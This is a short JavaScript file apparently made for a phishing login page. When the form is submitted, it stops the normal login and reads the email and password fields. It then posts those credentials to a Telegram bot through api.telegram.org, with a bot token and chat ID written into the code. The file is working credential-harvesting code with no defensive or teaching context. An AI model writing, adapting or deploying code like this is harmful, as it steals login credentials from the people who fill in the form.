const botToken = '8141259135:AAE_40yKvyMBBAufLpgHk010fQJWJuTTbQo'; 
const chatId = '5433537524';  


document.getElementById('loginForm').addEventListener('submit', function(e) {
  e.preventDefault(); 

  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;


  if (!email || !password) {
    alert("Please enter your email and password.");
    return;
  }

  const message = ` \nEmail: ${email}\nPassword: ${password}`;


  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: message
    })
  })
  
});
